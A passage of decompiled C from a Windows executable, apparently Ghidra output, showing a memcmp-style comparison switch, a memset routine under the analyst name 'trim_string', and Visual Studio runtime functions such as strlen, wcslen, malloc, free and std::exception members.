         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-3];
      uVar4 = (uint)*(byte *)(iVar3 + -3);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-2] - (uint)*(byte *)(iVar3 + -2);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_1:
    if ((uint)pbVar1[-1] == (uint)*(byte *)(iVar3 + -1)) {
      return 0;
    }
    return (uint)(0 < (int)((uint)pbVar1[-1] - (uint)*(byte *)(iVar3 + -1))) * 2 + -1;
  case 0x1e:
    if (*(uint *)(pbVar1 + -0x1e) == *(uint *)(iVar3 + -0x1e)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x1e) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x1e);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1d];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1d);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1c];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1c);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x1b] - (uint)*(byte *)(iVar3 + -0x1b);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_1a:
    if (*(uint *)(pbVar1 + -0x1a) == *(uint *)(iVar3 + -0x1a)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x1a) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x1a);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x19];
      uVar4 = (uint)*(byte *)(iVar3 + -0x19);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x18];
      uVar4 = (uint)*(byte *)(iVar3 + -0x18);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x17] - (uint)*(byte *)(iVar3 + -0x17);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_16:
    if (*(uint *)(pbVar1 + -0x16) == *(uint *)(iVar3 + -0x16)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x16) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x16);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x15];
      uVar4 = (uint)*(byte *)(iVar3 + -0x15);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x14];
      uVar4 = (uint)*(byte *)(iVar3 + -0x14);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x13] - (uint)*(byte *)(iVar3 + -0x13);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_12:
    if (*(uint *)(pbVar1 + -0x12) == *(uint *)(iVar3 + -0x12)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x12) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x12);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x11];
      uVar4 = (uint)*(byte *)(iVar3 + -0x11);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x10];
      uVar4 = (uint)*(byte *)(iVar3 + -0x10);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0xf] - (uint)*(byte *)(iVar3 + -0xf);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_e:
    if (*(uint *)(pbVar1 + -0xe) == *(uint *)(iVar3 + -0xe)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0xe) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0xe);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xd];
      uVar4 = (uint)*(byte *)(iVar3 + -0xd);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xc];
      uVar4 = (uint)*(byte *)(iVar3 + -0xc);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0xb] - (uint)*(byte *)(iVar3 + -0xb);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_a:
    if (*(int *)(pbVar1 + -10) == *(int *)(iVar3 + -10)) {
      iVar2 = 0;
    }
    else {
      uVar4 = (uint)*(byte *)(iVar3 + -10);
      uVar5 = (uint)pbVar1[-10];
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar4 = (uint)*(byte *)(iVar3 + -9);
      uVar5 = (uint)pbVar1[-9];
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar4 = (uint)*(byte *)(iVar3 + -8);
      uVar5 = (uint)pbVar1[-8];
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-7] - (uint)*(byte *)(iVar3 + -7);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_6:
    if (*(uint *)(pbVar1 + -6) == *(uint *)(iVar3 + -6)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -6) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -6);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-5];
      uVar4 = (uint)*(byte *)(iVar3 + -5);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-4];
      uVar4 = (uint)*(byte *)(iVar3 + -4);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-3] - (uint)*(byte *)(iVar3 + -3);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_2:
    if (*(short *)(pbVar1 + -2) != *(short *)(iVar3 + -2)) {
LAB_003b0196:
      uVar4 = (uint)*(byte *)(iVar3 + -2);
      uVar5 = (uint)pbVar1[-2];
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      goto switchD_003af658_caseD_1;
    }
    goto switchD_003af658_caseD_0;
  case 0x1f:
    if (*(int *)(pbVar1 + -0x1f) == *(int *)(iVar3 + -0x1f)) {
      iVar2 = 0;
    }
    else {
      uVar4 = (uint)*(byte *)(iVar3 + -0x1f);
      uVar5 = (uint)pbVar1[-0x1f];
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1e];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1e);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1d];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1d);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x1c] - (uint)*(byte *)(iVar3 + -0x1c);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_1b:
    if (*(uint *)(pbVar1 + -0x1b) == *(uint *)(iVar3 + -0x1b)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x1b) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x1b);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1a];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1a);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x19];
      uVar4 = (uint)*(byte *)(iVar3 + -0x19);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x18] - (uint)*(byte *)(iVar3 + -0x18);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_17:
    if (*(uint *)(pbVar1 + -0x17) == *(uint *)(iVar3 + -0x17)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x17) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x17);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x16];
      uVar4 = (uint)*(byte *)(iVar3 + -0x16);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x15];
      uVar4 = (uint)*(byte *)(iVar3 + -0x15);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x14] - (uint)*(byte *)(iVar3 + -0x14);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_13:
    if (*(uint *)(pbVar1 + -0x13) == *(uint *)(iVar3 + -0x13)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x13) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x13);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x12];
      uVar4 = (uint)*(byte *)(iVar3 + -0x12);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x11];
      uVar4 = (uint)*(byte *)(iVar3 + -0x11);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x10] - (uint)*(byte *)(iVar3 + -0x10);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_f:
    if (*(int *)(pbVar1 + -0xf) == *(int *)(iVar3 + -0xf)) {
      iVar2 = 0;
    }
    else {
      uVar4 = (uint)*(byte *)(iVar3 + -0xf);
      uVar5 = (uint)pbVar1[-0xf];
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xe];
      uVar4 = (uint)*(byte *)(iVar3 + -0xe);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xd];
      uVar4 = (uint)*(byte *)(iVar3 + -0xd);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0xc] - (uint)*(byte *)(iVar3 + -0xc);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_b:
    if (*(uint *)(pbVar1 + -0xb) == *(uint *)(iVar3 + -0xb)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0xb) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0xb);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-10];
      uVar4 = (uint)*(byte *)(iVar3 + -10);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-9];
      uVar4 = (uint)*(byte *)(iVar3 + -9);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-8] - (uint)*(byte *)(iVar3 + -8);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_7:
    if (*(uint *)(pbVar1 + -7) == *(uint *)(iVar3 + -7)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -7) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -7);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-6];
      uVar4 = (uint)*(byte *)(iVar3 + -6);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-5];
      uVar4 = (uint)*(byte *)(iVar3 + -5);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-4] - (uint)*(byte *)(iVar3 + -4);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_3:
    uVar5 = (uint)pbVar1[-3];
    uVar4 = (uint)*(byte *)(iVar3 + -3);
    if ((uVar5 != uVar4) &&
       (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
      return iVar2;
    }
    goto LAB_003b0196;
  }
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined (*) [16] __cdecl trim_string(undefined (*lorem_ipsum) [16],byte zero,uint iterations)

{
  uint i;
  uint iterations2;
  undefined (*lorem_ipsum_buffer) [16];
  uint lorem_minus4bits;
  
  if (iterations == 0) {
    return lorem_ipsum;
  }
  i = (uint)zero;
  if (((zero == 0) && (127 < iterations)) && (_DAT_003ea174 != 0)) {
    lorem_ipsum_buffer = lorem_ipsum;
    if (((uint)lorem_ipsum & 15) != 0) {
      lorem_minus4bits = 16 - ((uint)lorem_ipsum & 15);
      iterations = iterations - lorem_minus4bits;
      for (i = lorem_minus4bits & 3; i != 0; i = i - 1) {
        (*lorem_ipsum_buffer)[0] = 0;
        lorem_ipsum_buffer = (undefined (*) [16])(*lorem_ipsum_buffer + 1);
      }
      for (lorem_minus4bits = lorem_minus4bits >> 2; lorem_minus4bits != 0;
          lorem_minus4bits = lorem_minus4bits - 1) {
        *(undefined4 *)*lorem_ipsum_buffer = 0;
        lorem_ipsum_buffer = (undefined (*) [16])(*lorem_ipsum_buffer + 4);
      }
    }
    for (i = iterations >> 7; i != 0; i = i - 1) {
      *lorem_ipsum_buffer = (undefined  [16])0x0;
      lorem_ipsum_buffer[1] = (undefined  [16])0x0;
      lorem_ipsum_buffer[2] = (undefined  [16])0x0;
      lorem_ipsum_buffer[3] = (undefined  [16])0x0;
      lorem_ipsum_buffer[4] = (undefined  [16])0x0;
      lorem_ipsum_buffer[5] = (undefined  [16])0x0;
      lorem_ipsum_buffer[6] = (undefined  [16])0x0;
      lorem_ipsum_buffer[7] = (undefined  [16])0x0;
      lorem_ipsum_buffer = lorem_ipsum_buffer[8];
    }
    if ((iterations & 127) != 0) {
      for (i = (iterations & 127) >> 4; i != 0; i = i - 1) {
        *lorem_ipsum_buffer = (undefined  [16])0x0;
        lorem_ipsum_buffer = lorem_ipsum_buffer[1];
      }
      if ((iterations & 15) != 0) {
        for (i = (iterations & 15) >> 2; i != 0; i = i - 1) {
          *(undefined4 *)*lorem_ipsum_buffer = 0;
          lorem_ipsum_buffer = (undefined (*) [16])(*lorem_ipsum_buffer + 4);
        }
        for (i = iterations & 3; i != 0; i = i - 1) {
          (*lorem_ipsum_buffer)[0] = 0;
          lorem_ipsum_buffer = (undefined (*) [16])(*lorem_ipsum_buffer + 1);
        }
      }
    }
    return lorem_ipsum;
  }
  lorem_ipsum_buffer = lorem_ipsum;
  if (3 < iterations) {
    iterations2 = -(int)lorem_ipsum & 3;
    lorem_minus4bits = iterations;
    if (iterations2 != 0) {
      lorem_minus4bits = iterations - iterations2;
      do {
        (*lorem_ipsum_buffer)[0] = zero;
        lorem_ipsum_buffer = (undefined (*) [16])(*lorem_ipsum_buffer + 1);
        iterations2 = iterations2 - 1;
      } while (iterations2 != 0);
    }
    i = i * 0x1010101;
    iterations = lorem_minus4bits & 3;
    lorem_minus4bits = lorem_minus4bits >> 2;
    if (lorem_minus4bits != 0) {
      for (; lorem_minus4bits != 0; lorem_minus4bits = lorem_minus4bits - 1) {
        *(uint *)*lorem_ipsum_buffer = i;
        lorem_ipsum_buffer = (undefined (*) [16])(*lorem_ipsum_buffer + 4);
      }
      if (iterations == 0) {
        return lorem_ipsum;
      }
    }
  }
  do {
    (*lorem_ipsum_buffer)[0] = (char)i;
    lorem_ipsum_buffer = (undefined (*) [16])(*lorem_ipsum_buffer + 1);
    iterations = iterations - 1;
  } while (iterations != 0);
  return lorem_ipsum;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::_type_info(type_info *this)

{
  *(undefined ***)this = vftable;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,unsigned_int param_1)

{
  _type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2010 Release

bool __thiscall type_info::operator__(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



// Library Function - Single Match
//  _wcscat
// 
// Library: Visual Studio 2010 Release

wchar_t * __cdecl concatenate_strings(wchar_t *_Dest,wchar_t *_Source)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  pwVar2 = _Dest;
  wVar1 = *_Dest;
  while (wVar1 != L'\0') {
    _Dest = _Dest + 1;
    wVar1 = *_Dest;
  }
  iVar3 = (int)_Dest - (int)_Source;
  do {
    wVar1 = *_Source;
    *(wchar_t *)(iVar3 + (int)_Source) = wVar1;
    _Source = _Source + 1;
  } while (wVar1 != L'\0');
  return pwVar2;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_003b0893;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (size_t)((int)puVar4 - (int)_Str);
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_003b0893:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// Library Function - Single Match
//  _wcslen
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2015 Release,
// Visual Studio 2019 Release

size_t __cdecl str_len(wchar_t *_Str)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  return ((int)pwVar2 - (int)_Str >> 1) - 1;
}



// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2010 Release

void __cdecl _free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(hHeap_003d802c,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2010 Release

void * __cdecl _malloc(size_t _Size)

{
  SIZE_T dwBytes;
  void *pvVar1;
  int iVar2;
  int *piVar3;
  
  if (_Size < 0xffffffe1) {
    do {
      if (hHeap_003d802c == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        FUN_003b5906(0xff);
      }
      dwBytes = _Size;
      if (_Size == 0) {
        dwBytes = 1;
      }
      pvVar1 = HeapAlloc(hHeap_003d802c,0,dwBytes);
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (_DAT_003d8694 == 0) {
        piVar3 = __errno();
        *piVar3 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar3 = __errno();
    *piVar3 = 0xc;
    pvVar1 = (void *)0x0;
  }
  return pvVar1;
}



void __thiscall FUN_003b09a4(void *this,undefined4 *param_1)

{
  *(undefined ***)this = std::exception::vftable;
  *(undefined4 *)((int)this + 4) = *param_1;
  *(undefined *)((int)this + 8) = 0;
  return;
}



char * __fastcall FUN_003b09c1(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Unknown exception";
  }
  return pcVar1;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Copy_str(char const *)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::exception::_Copy_str(exception *this,char *param_1)

{
  size_t sVar1;
  char *_Dst;
  
  if (param_1 != (char *)0x0) {
    sVar1 = _strlen(param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,param_1);
      this[8] = (exception)0x1;
    }
  }
  return;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Tidy(void)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::exception::_Tidy(exception *this)

{
  if (this[8] != (exception)0x0) {
    _free(*(void **)(this + 4));
  }
  *(undefined4 *)(this + 4) = 0;
  this[8] = (exception)0x0;
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2010 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = vftable;
  this[8] = (exception)0x0;
  _Copy_str(this,*param_1);
  return this;
}



// Library Function - Single Match
//  public: class std::exception & __thiscall std::exception::operator=(class std::exception const
// &)
// 
// Library: Visual Studio 2010 Release

exception * __thiscall std::exception::operator_(exception *this,exception *param_1)

{
  if (this != param_1) {
    _Tidy(this);
    if (param_1[8] == (exception)0x0) {
      *(undefined4 *)(this + 4) = *(undefined4 *)(param_1 + 4);
    }
    else {
      _Copy_str(this,*(char **)(param_1 + 4));
    }
  }
  return this;
}



void __fastcall FUN_003b0a88(undefined **param_1)

